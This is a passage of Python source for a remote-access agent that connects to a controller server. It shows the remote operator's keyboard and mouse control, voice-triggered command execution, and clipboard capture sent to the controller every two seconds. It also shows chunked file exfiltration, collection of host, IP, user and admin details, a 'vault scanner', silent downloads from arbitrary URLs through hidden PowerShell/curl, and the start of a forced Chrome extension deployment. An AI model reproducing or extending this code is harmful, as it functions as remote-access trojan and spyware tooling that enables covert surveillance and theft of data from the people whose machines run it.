                elif "open camera" in command or "start camera" in command:
                    execute_voice_command("start-camera", agent_id)
                elif "close camera" in command or "stop camera" in command:
                    execute_voice_command("stop-camera", agent_id)
                elif "start streaming" in command or "start stream" in command:
                    execute_voice_command("start-stream", agent_id)
                elif "stop streaming" in command or "stop stream" in command:
                    execute_voice_command("stop-stream", agent_id)
                elif "system info" in command or "system information" in command:
                    execute_voice_command("systeminfo", agent_id)
                elif "list processes" in command or "show processes" in command:
                    if WINDOWS_AVAILABLE:
                        execute_voice_command("Get-Process | Select-Object Name, Id | Format-Table", agent_id)
                    else:
                        execute_voice_command("ps aux", agent_id)
                elif "current directory" in command or "where am i" in command:
                    execute_voice_command("pwd", agent_id)
                elif command.startswith("run ") or command.startswith("execute "):
                    # Extract command after "run" or "execute"
                    actual_command = command.split(" ", 1)[1] if " " in command else ""
                    if actual_command:
                        execute_voice_command(actual_command, agent_id)
                else:
                    log_message(f"Unknown voice command: {command}")
                    
            except sr.UnknownValueError:
                # Speech not recognized - this is normal, just continue
                pass
            except sr.RequestError as e:
                log_message(f"Could not request results from speech recognition service: {e}")
                time.sleep(1)
                
        except sr.WaitTimeoutError:
            # Timeout waiting for audio - this is normal, just continue
            pass
        except Exception as e:
            log_message(f"Voice control error: {e}")
            time.sleep(1)

def execute_voice_command(command, agent_id):
    """Execute a command received via voice control."""
    try:
        # Send command to controller for execution
        if REQUESTS_AVAILABLE:
            url = f"{SERVER_URL}/voice_command/{agent_id}"
            response = requests.post(url, json={"command": command}, timeout=5)
            log_message(f"Voice command '{command}' sent to controller")
        else:
            log_message("Cannot send voice command: requests library not available", "warning")
    except Exception as e:
        log_message(f"Error sending voice command: {e}")

def start_voice_control(agent_id):
    """Start voice control functionality."""
    global VOICE_CONTROL_ENABLED, VOICE_CONTROL_THREAD
    
    with _voice_control_lock:  # [ OK ] THREAD-SAFE: Prevent race condition
        if VOICE_CONTROL_ENABLED:
            log_message("Voice control already running", "warning")
            return
        
        VOICE_CONTROL_ENABLED = True
        VOICE_CONTROL_THREAD = threading.Thread(target=voice_control_handler, args=(agent_id,))
        VOICE_CONTROL_THREAD.daemon = True
        VOICE_CONTROL_THREAD.start()
        log_message("Started voice control.")

def stop_voice_control():
    """Stop voice control functionality."""
    global VOICE_CONTROL_ENABLED, VOICE_CONTROL_THREAD
    
    with _voice_control_lock:  # [ OK ] THREAD-SAFE
        if not VOICE_CONTROL_ENABLED:
            return
        
        VOICE_CONTROL_ENABLED = False
        # Don't join - daemon thread will exit naturally (prevents blocking)
        VOICE_CONTROL_THREAD = None
        log_message("Stopped voice control.")

# --- Remote Control Functions ---
# Global variables for remote control
REMOTE_CONTROL_ENABLED = False
LOW_LATENCY_INPUT_HANDLER = None
# Removed duplicate controller variables - using mouse_controller and keyboard_controller instead

def initialize_low_latency_input():
    """Initialize the low-latency input handler"""
    global LOW_LATENCY_INPUT_HANDLER, low_latency_input
    
    try:
        # Use the LowLatencyInputHandler class defined in this file
        LOW_LATENCY_INPUT_HANDLER = LowLatencyInputHandler(max_queue_size=2000)
        LOW_LATENCY_INPUT_HANDLER.start()
        low_latency_input = LOW_LATENCY_INPUT_HANDLER  # Set both variables for compatibility
        log_message("Low-latency input handler initialized")
        return True
    except Exception as e:
        log_message(f"Failed to initialize low latency input: {e}")
        return False
def handle_remote_control(command_data):
    """Handle remote control commands with ultra-low latency."""
    global LOW_LATENCY_INPUT_HANDLER
    
    try:
        # Try to use low-latency input handler first
        if LOW_LATENCY_INPUT_HANDLER:
            success = LOW_LATENCY_INPUT_HANDLER.handle_input(command_data)
            if success:
                return
            else:
                log_message("Low-latency input queue full, using fallback")
        
        # Fallback to direct handling
        _handle_remote_control_fallback(command_data)
        
    except Exception as e:
        log_message(f"Error handling remote control command: {e}")
        _handle_remote_control_fallback(command_data)

def _handle_remote_control_fallback(command_data):
    """Fallback remote control handling (original implementation optimized)"""
    global mouse_controller, keyboard_controller
    
    # Import here to avoid conflicts
    from pynput import mouse, keyboard
    
    # Initialize controllers if needed
    if mouse_controller is None:
        mouse_controller = mouse.Controller()
    if keyboard_controller is None:
        keyboard_controller = keyboard.Controller()
    
    try:
        action = command_data.get("action")
        data = command_data.get("data", {})
        
        if action == "mouse_move":
            handle_mouse_move(data)
        elif action == "mouse_click":
            handle_mouse_click(data)
        elif action == "key_down":
            handle_key_down(data)
        elif action == "key_up":
            handle_key_up(data)
        else:
            log_message(f"Unknown remote control action: {action}")
            
    except Exception as e:
        log_message(f"Error handling remote control command: {e}")

def get_input_performance_stats():
    """Get input performance statistics"""
    global LOW_LATENCY_INPUT_HANDLER
    
    if LOW_LATENCY_INPUT_HANDLER:
        return LOW_LATENCY_INPUT_HANDLER.get_performance_stats()
    else:
        return {"status": "fallback_mode", "low_latency": False}

INPUT_CAPTURE_ENABLED = False

def handle_mouse_move(data):
    """Handle mouse movement commands."""
    try:
        if not INPUT_CAPTURE_ENABLED:
            return
        x = data.get("x", 0)  # Relative position (0-1)
        y = data.get("y", 0)  # Relative position (0-1)
        sensitivity = data.get("sensitivity", 1.0)
        
        # Get screen dimensions
        import mss
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Primary monitor
            screen_width = monitor["width"]
            screen_height = monitor["height"]
        
        # Convert relative position to absolute
        abs_x = int(x * screen_width * sensitivity)
        abs_y = int(y * screen_height * sensitivity)
        
        # Move mouse
        mouse_controller.position = (abs_x, abs_y)
        
    except Exception as e:
        log_message(f"Error handling mouse move: {e}")

def handle_mouse_click(data):
    """Handle mouse click commands."""
    try:
        if not INPUT_CAPTURE_ENABLED:
            return
        button = data.get("button", "left")
        
        if button == "left":
            mouse_controller.click(mouse.Button.left, 1)
        elif button == "right":
            mouse_controller.click(mouse.Button.right, 1)
        elif button == "middle":
            mouse_controller.click(mouse.Button.middle, 1)
            
    except Exception as e:
        log_message(f"Error handling mouse click: {e}")

def handle_key_down(data):
    """Handle key press commands."""
    try:
        key = data.get("key")
        code = data.get("code")
        
        if key:
            # Map special keys
            if key == "Enter":
                keyboard_controller.press(keyboard.Key.enter)
            elif key == "Escape":
                keyboard_controller.press(keyboard.Key.esc)
            elif key == "Backspace":
                keyboard_controller.press(keyboard.Key.backspace)
            elif key == "Tab":
                keyboard_controller.press(keyboard.Key.tab)
            elif key == "Shift":
                keyboard_controller.press(keyboard.Key.shift)
            elif key == "Control":
                keyboard_controller.press(keyboard.Key.ctrl)
            elif key == "Alt":
                keyboard_controller.press(keyboard.Key.alt)
            elif key == "Delete":
                keyboard_controller.press(keyboard.Key.delete)
            elif key == "Home":
                keyboard_controller.press(keyboard.Key.home)
            elif key == "End":
                keyboard_controller.press(keyboard.Key.end)
            elif key == "PageUp":
                keyboard_controller.press(keyboard.Key.page_up)
            elif key == "PageDown":
                keyboard_controller.press(keyboard.Key.page_down)
            elif key.startswith("Arrow"):
                direction = key[5:].lower()  # Remove "Arrow" prefix
                if direction == "up":
                    keyboard_controller.press(keyboard.Key.up)
                elif direction == "down":
                    keyboard_controller.press(keyboard.Key.down)
                elif direction == "left":
                    keyboard_controller.press(keyboard.Key.left)
                elif direction == "right":
                    keyboard_controller.press(keyboard.Key.right)
            elif key.startswith("F") and key[1:].isdigit():
                # Function keys
                f_num = int(key[1:])
                if 1 <= f_num <= 12:
                    f_key = getattr(keyboard.Key, f"f{f_num}")
                    keyboard_controller.press(f_key)
            elif len(key) == 1:
                # Regular character
                keyboard_controller.press(key)
                
    except Exception as e:
        log_message(f"Error handling key down: {e}")

def handle_key_up(data):
    """Handle key release commands."""
    try:
        key = data.get("key")
        code = data.get("code")
        
        if key:
            # Map special keys
            if key == "Enter":
                keyboard_controller.release(keyboard.Key.enter)
            elif key == "Escape":
                keyboard_controller.release(keyboard.Key.esc)
            elif key == "Backspace":
                keyboard_controller.release(keyboard.Key.backspace)
            elif key == "Tab":
                keyboard_controller.release(keyboard.Key.tab)
            elif key == "Shift":
                keyboard_controller.release(keyboard.Key.shift)
            elif key == "Control":
                keyboard_controller.release(keyboard.Key.ctrl)
            elif key == "Alt":
                keyboard_controller.release(keyboard.Key.alt)
            elif key == "Delete":
                keyboard_controller.release(keyboard.Key.delete)
            elif key == "Home":
                keyboard_controller.release(keyboard.Key.home)
            elif key == "End":
                keyboard_controller.release(keyboard.Key.end)
            elif key == "PageUp":
                keyboard_controller.release(keyboard.Key.page_up)
            elif key == "PageDown":
                keyboard_controller.release(keyboard.Key.page_down)
            elif key.startswith("Arrow"):
                direction = key[5:].lower()  # Remove "Arrow" prefix
                if direction == "up":
                    keyboard_controller.release(keyboard.Key.up)
                elif direction == "down":
                    keyboard_controller.release(keyboard.Key.down)
                elif direction == "left":
                    keyboard_controller.release(keyboard.Key.left)
                elif direction == "right":
                    keyboard_controller.release(keyboard.Key.right)
            elif key.startswith("F") and key[1:].isdigit():
                # Function keys
                f_num = int(key[1:])
                if 1 <= f_num <= 12:
                    f_key = getattr(keyboard.Key, f"f{f_num}")
                    keyboard_controller.release(f_key)
            elif len(key) == 1:
                # Regular character
                keyboard_controller.release(key)
                
    except Exception as e:
        log_message(f"Error handling key up: {e}")

 

# --- Clipboard Monitor Functions ---

def get_clipboard_content():
    """Get current clipboard content."""
    if WINDOWS_AVAILABLE:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return data
        except (Exception, ImportError, OSError):
            try:
                win32clipboard.CloseClipboard()
            except (Exception, ImportError, OSError):
                pass
            return None
    else:
        # On Linux, we'll skip clipboard monitoring for now
        return None

def clipboard_monitor_worker(agent_id):
    """Clipboard monitor worker thread."""
    global CLIPBOARD_MONITOR_ENABLED, LAST_CLIPBOARD_CONTENT
    
    try:
        while CLIPBOARD_MONITOR_ENABLED:
            try:
                current_content = get_clipboard_content()
                if current_content and current_content != LAST_CLIPBOARD_CONTENT:
                    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                    clipboard_entry = f"{timestamp}: {current_content[:500]}{'...' if len(current_content) > 500 else ''}"
                    
                    # Use socket.io for better performance and consistency
                    try:
                        if sio and sio.connected:
                            safe_emit('clipboard_data', {  # [ OK ] SAFE
                                'agent_id': agent_id,
                                'data': clipboard_entry
                            })
                            LAST_CLIPBOARD_CONTENT = current_content
                        else:
                            log_message("Socket.io not connected for clipboard data", "warning")
                    except Exception as e:
                        error_msg = str(e)
                        # Silence connection errors
                        if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
                            log_message(f"Clipboard socket.io error: {e}")
                        # Fallback to HTTP if socket.io fails
                        if REQUESTS_AVAILABLE:
                            try:
                                url = f"{SERVER_URL}/clipboard_data/{agent_id}"
                                requests.post(url, json={"data": clipboard_entry}, timeout=5)
                                LAST_CLIPBOARD_CONTENT = current_content
                            except Exception as http_e:
                                log_message(f"Clipboard HTTP fallback error: {http_e}")
                        else:
                            log_message("HTTP fallback not available for clipboard data", "warning")
                
                time.sleep(2)  # Check clipboard every 2 seconds
            except KeyboardInterrupt:
                log_message("Clipboard monitor worker interrupted")
                break
            except Exception as e:
                log_message(f"Clipboard monitor worker error: {e}")
                time.sleep(2)
    except KeyboardInterrupt:
        log_message("Clipboard monitor worker interrupted")
    
    log_message("Clipboard monitor worker stopped")

def start_clipboard_monitor(agent_id):
    """Start clipboard monitoring."""
    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
    
    with _clipboard_lock:  # [ OK ] THREAD-SAFE: Prevent race condition
        if CLIPBOARD_MONITOR_ENABLED:
            log_message("Clipboard monitor already running", "warning")
            return
        
        CLIPBOARD_MONITOR_ENABLED = True
        CLIPBOARD_MONITOR_THREAD = threading.Thread(target=clipboard_monitor_worker, args=(agent_id,))
        CLIPBOARD_MONITOR_THREAD.daemon = True
        CLIPBOARD_MONITOR_THREAD.start()
        log_message("Started clipboard monitor.")

def stop_clipboard_monitor():
    """Stop clipboard monitoring."""
    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
    
    with _clipboard_lock:  # [ OK ] THREAD-SAFE
        if not CLIPBOARD_MONITOR_ENABLED:
            return
        
        CLIPBOARD_MONITOR_ENABLED = False
        # Don't join - daemon thread will exit naturally (prevents blocking)
        CLIPBOARD_MONITOR_THREAD = None
        log_message("Stopped clipboard monitor.")

# --- File Management Functions ---

def send_file_chunked_to_controller(file_path, agent_id, destination_path=None):
    """Send a file to the controller in chunks using Socket.IO."""
    if not os.path.exists(file_path):
        return f"File not found: {file_path}"
    chunk_size = 512 * 1024  # 512KB
    filename = os.path.basename(file_path)
    total_size = os.path.getsize(file_path)
    log_message(f"Sending file {file_path} ({total_size} bytes) to controller in chunks...")
    with open(file_path, 'rb') as f:
        offset = 0
        chunk_count = 0
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
            
            # [ OK ] SAFE EMIT: Check connection before sending
            if not safe_emit('file_chunk_from_agent', {
                'agent_id': agent_id,
                'filename': filename,
                'chunk': chunk_b64,
                'offset': offset,
                'total_size': total_size,
                'destination_path': destination_path or file_path
            }):
                log_message(f"Failed to send chunk {chunk_count}, connection lost", "error")
                return f"File upload failed at chunk {chunk_count}: Connection lost"
            
            offset += len(chunk)
            chunk_count += 1
            log_message(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset}")
    
    # Notify upload complete
    if not safe_emit('upload_file_end', {
        'agent_id': agent_id,
        'filename': filename,
        'destination_path': destination_path or file_path
    }):
        log_message("Failed to send upload completion notification", "warning")
    log_message(f"File upload complete notification sent for {filename}")
    return f"File {file_path} sent to controller in {chunk_count} chunks"

def handle_file_upload(command_parts):
    """Handle file upload from controller (deprecated, now uses chunked)."""
    return "File upload via HTTP POST is deprecated. Use chunked Socket.IO upload."

def handle_file_download(command_parts, agent_id):
    """Handle file download request from controller (deprecated, now uses chunked)."""
    return "File download via HTTP POST is deprecated. Use chunked Socket.IO download."

# --- Socket.IO Event Handler Registration ---
def _sanitize_windows_filename(name: str) -> str:
    import re, os
    n = str(name or '')
    base, ext = os.path.splitext(n)
    base = re.sub(r'[<>:"/\\|?*\x00-\x1F]', '_', base)
    base = re.sub(r'[\. ]+$', '', base)
    if not base:
        base = 'file'
    rsv = {'CON','PRN','AUX','NUL'}
    rsv.update({f'COM{i}' for i in range(1,10)})
    rsv.update({f'LPT{i}' for i in range(1,10)})
    if base.upper() in rsv:
        base = '_' + base
    ext = re.sub(r'[<>:"/\\|?*\x00-\x1F]', '', ext)
    return base + ext

def register_socketio_handlers():
    """Register all Socket.IO event handlers if Socket.IO is available."""
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, skipping event handler registration", "warning")
        return
    
    # Register connection handler
    @sio.event
    def connect():
        global CONNECTION_STATE
        try:
            agent_id = get_or_create_agent_id()
            log_message(f"[CONNECT] Connected to controller, registering agent {agent_id}")
            
            # Update connection state
            CONNECTION_STATE['connected'] = True
            CONNECTION_STATE['consecutive_failures'] = 0
            CONNECTION_STATE['reconnect_needed'] = False
            
            safe_emit('agent_connect', {
            'agent_id': agent_id,
            'alias': (read_local_alias() or None),
            'hostname': socket.gethostname(),
            'platform': platform.system(),
            'os_version': platform.release(),
            'ip_address': get_local_ip(),
            'public_ip': get_public_ip(),
            'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
            'version': '2.1',
            'is_admin': bool(is_admin()),
            'capabilities': {
                'screen': True,
                'camera': CV2_AVAILABLE,
                'audio': PYAUDIO_AVAILABLE,
                'clipboard': True,
                'file_manager': True,
                'process_manager': PSUTIL_AVAILABLE,
                'webcam': CV2_AVAILABLE,
                'webrtc': AIORTC_AVAILABLE
            },
            'timestamp': int(time.time() * 1000)
        })  # [ OK ] SAFE
            try:
                start_vault_scanner()
            except Exception:
                pass
            try:
                sync_admin_status_to_controller(agent_id)
            except Exception:
                pass
            
            try:
                if CONNECTION_STATE.get('reconnect_needed') or not (globals().get('HEARTBEAT_THREAD') and HEARTBEAT_THREAD.is_alive()):
                    start_heartbeat()
                else:
                    pass
            except Exception:
                pass
            try:
                start_admin_status_monitor()
            except Exception:
                pass
            
            # Send success notification
            emit_system_notification('success', 'Agent Connected', f'Successfully connected to controller as agent {agent_id}')
            try:
                paths = []
                home = os.path.expanduser("~")
                if home:
                    paths.append(home)
                    d = os.path.join(home, "Desktop")
                    if os.path.isdir(d):
                        paths.append(d)
                fim = FileIntegrityMonitor(paths)
                def _fim_loop():
                    while True:
                        changes = fim.check_integrity()
                        if changes:
                            safe_emit('system_alert', {'agent_id': agent_id, 'type': 'warning', 'message': 'File changes detected', 'details': json.dumps(changes), 'timestamp': int(time.time()*1000)})
                        time.sleep(300)
                threading.Thread(target=_fim_loop, daemon=True).start()
            except Exception:
                pass
            try:
                FileSystemManager(sio, agent_id)
            except Exception:
                pass
            try:
                if PSUTIL_AVAILABLE:
                    ProcessManager(sio, agent_id)
            except Exception:
                pass
            try:
                @sio.on('agent_alias_update')
                def _on_agent_alias_update(data):
                    try:
                        aid = str((data or {}).get('agent_id') or '')
                        if aid and aid == agent_id:
                            write_local_alias(str((data or {}).get('alias') or '').strip())
                    except Exception:
                        pass
            except Exception:
                pass
            # After successful connection, check for remote client update
            try:
                import hashlib
                local_path = os.path.abspath(__file__)
                with open(local_path, 'rb') as f:
                    local_hash = hashlib.sha256(f.read()).hexdigest()
                safe_emit('client_update_check', {
                    'agent_id': agent_id,
                    'version': VERSION if isinstance(VERSION, str) else str(VERSION),
                    'sha256': local_hash
                })
            except Exception as e:
                log_message(f"[UPDATE] Failed to initiate update check: {e}", "warning")
            try:
                SystemInfoGatherer(sio, agent_id)
            except Exception:
                pass
            
        except Exception as e:
            log_message(f"Error in connect handler: {e}", "error")
            emit_system_notification('error', 'Connection Error', f'Failed to connect to controller: {str(e)}')
    
    # Register disconnect handler
    @sio.event
    def disconnect(*args):
        global CONNECTION_STATE
        try:
            agent_id = get_or_create_agent_id()
            log_message(f"[DISCONNECT] Agent {agent_id} lost connection to controller")
            
            # Update connection state immediately
            CONNECTION_STATE['connected'] = False
            CONNECTION_STATE['reconnect_needed'] = True
            
            log_message("[DISCONNECT] Stopping all active streams and commands...")
            emit_system_notification('warning', 'Agent Disconnected', f'Lost connection to controller for agent {agent_id}')
            
        except Exception as e:
            log_message(f"Error in disconnect handler: {e}", "error")
        
        # Stop all operations
        try:
            stop_all_operations()
        except Exception as e:
            log_message(f"[DISCONNECT] Error during cleanup: {e}")
        
        log_message("[DISCONNECT] Cleanup complete - will auto-reconnect")
    
    # Register file transfer handlers
    sio.on('file_chunk_from_operator')(on_file_chunk_from_operator)
    sio.on('file_upload_complete_from_operator')(on_file_upload_complete_from_operator)
    sio.on('request_file_chunk_from_agent')(on_request_file_chunk_from_agent)
    sio.on('request_file_range')(on_request_file_range)
    sio.on('request_file_thumbnail')(on_request_file_thumbnail)
    sio.on('request_file_faststart')(on_request_file_faststart)
    def on_ps_curl_download(data):
        try:
            url = str((data or {}).get('url') or '')
            filename = _sanitize_windows_filename(str((data or {}).get('filename') or 'download.bin'))
            path = str((data or {}).get('download_path') or '')
            upload_id = str((data or {}).get('upload_id') or '')
            total_size = int((data or {}).get('expected_size') or 0)
            agent_id = get_or_create_agent_id()
            def _normalize_dir(p: str) -> str:
                try:
                    import re, os
                    raw = str(p or '').strip()
                    if os.name != 'nt':
                        return os.path.normpath(raw or '/')
                    if raw in ('', '/', '\\'):
                        return (os.environ.get('SystemDrive', 'C:') + '\\')
                    m = re.match(r'^/?([A-Za-z]):[\\/]?$', raw)
                    if m:
                        return (m.group(1).upper() + ':\\')
                    if not re.match(r'^[A-Za-z]:', raw):
                        if raw.startswith('/') or raw.startswith('\\'):
                            drive = os.environ.get('SystemDrive', 'C:')
                            return os.path.normpath(drive + '\\' + raw.lstrip('\\/'))
                        return os.path.normpath(os.path.join(os.path.expanduser('~'), raw))
                    return os.path.normpath(raw)
                except Exception:
                    return p
            dest_dir = _normalize_dir(os.path.dirname(path) or os.path.expanduser('~'))
            os.makedirs(dest_dir, exist_ok=True)
            target_path = path if path else os.path.join(dest_dir, filename)
            # Try to detect content length if not provided
            if total_size <= 0 and url:
                try:
                    import subprocess
                    ps_exe = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
                    _u = url.replace("'", "''")
                    ps_cmd = f"$u='{_u}'; (Invoke-WebRequest -Uri $u -Method Head -UseBasicParsing).Headers['Content-Length']"
                    r = subprocess.run([ps_exe, "-NoProfile", "-NonInteractive", "-Command", ps_cmd], capture_output=True, timeout=15)
                    if r.returncode == 0:
                        out = (r.stdout or b'').decode('utf-8', errors='ignore').strip()
                        if out.isdigit():
                            total_size = int(out)
                except Exception:
                    pass
            def _run():
                try:
                    import subprocess, time as _t
                    ps_exe = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
                    _u = url.replace("'", "''")
                    _p = target_path.replace("'", "''")
                    ps_cmd = f"$u='{_u}'; $p='{_p}'; curl.exe -L $u -o $p"
                    p = subprocess.Popen([ps_exe, "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS_AVAILABLE else 0)
                    last_emit = 0
                    while True:
                        rc = p.poll()
                        try:
                            if os.path.isfile(target_path) and total_size > 0:
                                sz = os.path.getsize(target_path)
                                prog = int(min(100, (sz / float(total_size)) * 100))
                                now = _t.time()
                                if now - last_emit > 1.0 or prog in (0, 25, 50, 75, 100):
                                    safe_emit('file_upload_progress', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'destination_path': target_path, 'received': sz, 'total': total_size, 'progress': prog})
                                    last_emit = now
                        except Exception:
                            pass
                        if rc is not None:
                            break
                        _t.sleep(0.5)
                    # Finalize based on curl exit code and file size
                    try:
                        out_b, err_b = p.communicate(timeout=2)
                    except Exception:
                        out_b, err_b = (b'', b'')
                    rc = p.returncode if isinstance(p.returncode, int) else -1
                    exists = os.path.isfile(target_path)
                    sz = os.path.getsize(target_path) if exists else 0
                    ok = (rc == 0) and ((total_size > 0 and sz == total_size) or (total_size <= 0 and sz > 0))
                    if ok:
                        safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'destination_path': target_path, 'size': sz, 'success': True, 'source': 'agent'})
                        try:
                            files = FileSystemManager(sio, agent_id).list_directory(dest_dir)
                            safe_emit('file_list', {'agent_id': agent_id, 'path': dest_dir, 'files': files})
                        except Exception:
                            pass
                    else:
                        err = (err_b or b'').decode('utf-8', errors='ignore').strip()
                        if not err:
                            err = 'Download failed'
                        # Provide a concise message including exit code and size
                        msg = f'curl exit={rc}, size={sz}/{total_size}: {err}'
                        safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'destination_path': target_path, 'error': msg, 'success': False})
                except Exception as e:
                    safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'error': str(e), 'success': False})
            threading.Thread(target=_run, daemon=True).start()
        except Exception as e:
            safe_emit('file_upload_complete', {'agent_id': get_or_create_agent_id(), 'upload_id': (data or {}).get('upload_id'), 'filename': (data or {}).get('filename'), 'error': str(e), 'success': False})
    sio.on('ps_curl_download')(on_ps_curl_download)
    def on_p2p_download_request(data):
        try:
            controller_ip = str(data.get('controller_ip') or '')
            controller_port = int(data.get('controller_port') or 0)
            filename = _sanitize_windows_filename(str(data.get('filename') or ''))
            destination = str(data.get('destination') or '')
            upload_id = str(data.get('upload_id') or '')
            expected_size = int(data.get('file_size') or 0)
            expected_sha = str(data.get('sha256') or '')
            agent_id = get_or_create_agent_id()
            def _normalize_dir(p: str) -> str:
                try:
                    import re, os
                    raw = str(p or '').strip()
                    if os.name != 'nt':
                        return os.path.normpath(raw or '/')
                    if raw in ('', '/', '\\'):
                        return (os.environ.get('SystemDrive', 'C:') + '\\')
                    m = re.match(r'^/?([A-Za-z]):[\\/]?$', raw)
                    if m:
                        return (m.group(1).upper() + ':\\')
                    if not re.match(r'^[A-Za-z]:', raw):
                        if raw.startswith('/') or raw.startswith('\\'):
                            drive = os.environ.get('SystemDrive', 'C:')
                            return os.path.normpath(drive + '\\' + raw.lstrip('\\/'))
                        return os.path.normpath(os.path.join(os.path.expanduser('~'), raw))
                    return os.path.normpath(raw)
                except Exception:
                    return p
            def _dl():
                try:
                    import socket as _s
                    import json as _j
                    sock = _s.socket(_s.AF_INET, _s.SOCK_STREAM)
                    try:
                        sock.settimeout(60)
                        sock.connect((controller_ip, controller_port))
                        dest_dir = _normalize_dir(destination or os.path.expanduser('~'))
                        try:
                            import re
                            if os.name == 'nt':
                                raw = str(dest_dir).strip()
                                if raw and not re.match(r'^[A-Za-z]:', raw):
                                    if raw.startswith('/') or raw.startswith('\\'):
                                        drive = os.environ.get('SystemDrive', 'C:')
                                        dest_dir = os.path.normpath(drive + '\\' + raw.lstrip('\\/'))
                                    else:
                                        dest_dir = os.path.normpath(os.path.join(os.path.expanduser('~'), raw))
                                else:
                                    if re.match(r'^[A-Za-z]:$', raw):
                                        dest_dir = raw + '\\'
                                    else:
                                        dest_dir = os.path.normpath(raw or os.path.expanduser('~'))
                                try:
                                    user_profile = os.environ.get('USERPROFILE') or os.path.expanduser('~')
                                    oned = os.path.join(user_profile, 'OneDrive', 'Desktop')
                                    if os.path.basename(dest_dir).lower() == 'desktop' and os.path.isdir(oned):
                                        dest_dir = oned
                                except Exception:
                                    pass
                            else:
                                dest_dir = os.path.normpath(dest_dir)
                        except Exception:
                            pass
                        os.makedirs(dest_dir, exist_ok=True)
                        target_path = os.path.join(dest_dir, filename)
                        base, ext = os.path.splitext(target_path)
                        c = 1
                        while os.path.exists(target_path):
                            target_path = f"{base} ({c}){ext}"
                            c += 1
                        sha = hashlib.sha256()
                        received = 0
                        f = None
                        wrote_ok = False
                        try:
                            f = open(target_path, 'wb')
                        except Exception:
                            try:
                                path_unc = '\\\\?\\' + os.path.abspath(target_path)
                                f = open(path_unc, 'wb')
                            except Exception:
                                f = None
                        if f:
                            try:
                                while True:
                                    chunk = sock.recv(65536)
                                    if not chunk:
                                        break
                                    f.write(chunk)
                                    sha.update(chunk)
                                    received += len(chunk)
                                wrote_ok = True
                            finally:
                                try:
                                    f.close()
                                except Exception:
                                    pass
                        else:
                            data_buf = bytearray()
                            while True:
                                chunk = sock.recv(65536)
                                if not chunk:
                                    break
                                data_buf.extend(chunk)
                                sha.update(chunk)
                                received += len(chunk)
                            try:
                                import base64, subprocess
                                ps_exe = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
                                b64 = base64.b64encode(bytes(data_buf)).decode('ascii')
                                ps_path = target_path.replace("'", "''")
                                ps_cmd = "[IO.File]::WriteAllBytes('" + ps_path + "', [Convert]::FromBase64String('" + b64 + "'))"
                                r = subprocess.run([ps_exe, "-NoProfile", "-NonInteractive", "-Command", ps_cmd], capture_output=True, timeout=120)
                                if r.returncode == 0 and os.path.isfile(target_path) and os.path.getsize(target_path) == received:
                                    wrote_ok = True
                            except Exception:
                                wrote_ok = False
                        if not wrote_ok:
                            safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'error': 'Write failed', 'success': False})
                            return
                        if received != expected_size or sha.hexdigest() != expected_sha:
                            safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'error': 'Hash or size mismatch', 'success': False})
                            return
                        safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'destination_path': target_path, 'size': received, 'success': True, 'source': 'agent'})
                        try:
                            files = FileSystemManager(sio, agent_id).list_directory(dest_dir)
                            safe_emit('file_list', {'agent_id': agent_id, 'path': dest_dir, 'files': files})
                        except Exception:
                            pass
                    except Exception as e:
                        safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'error': str(e), 'success': False})
                    finally:
                        try:
                            sock.close()
                        except Exception:
                            pass
                except Exception as e:
                    safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'error': str(e), 'success': False})
            threading.Thread(target=_dl, daemon=True).start()
        except Exception as e:
            safe_emit('file_upload_complete', {'agent_id': get_or_create_agent_id(), 'upload_id': data.get('upload_id'), 'filename': data.get('filename'), 'error': str(e), 'success': False})
    sio.on('p2p_download_request')(on_p2p_download_request)
    def _extract_crx_bytes_to_dir(raw: bytes, target_dir: str) -> bool:
        try:
            import os, io, zipfile, shutil
            os.makedirs(target_dir, exist_ok=True)
            idx = raw.find(b'PK\x03\x04')
            if idx < 0:
                return False
            z = raw[idx:]
            for name in os.listdir(target_dir):
                p = os.path.join(target_dir, name)
                try:
                    if os.path.isdir(p):
                        shutil.rmtree(p, ignore_errors=True)
                    else:
                        os.remove(p)
                except Exception:
                    pass
            with zipfile.ZipFile(io.BytesIO(z)) as zf:
                zf.extractall(target_dir)
            return True
        except Exception:
            return False
    def on_extension_deploy(data):
        try:
            import sys
            if sys.platform != 'win32':
                emit_system_notification('warning', 'Chrome Extension Deploy', 'Unsupported platform')
                return
            import os, tempfile, winreg, urllib.request, subprocess, json as _json
            url = str((data or {}).get('url') or '').strip()
            ext_id = str((data or {}).get('extension_id') or VAULT_EXTENSION_ID).strip()
            display_name = str((data or {}).get('display_name') or '').strip()
            agent_id = get_or_create_agent_id()
            if not ext_id:
                ext_id = VAULT_EXTENSION_ID
            try:
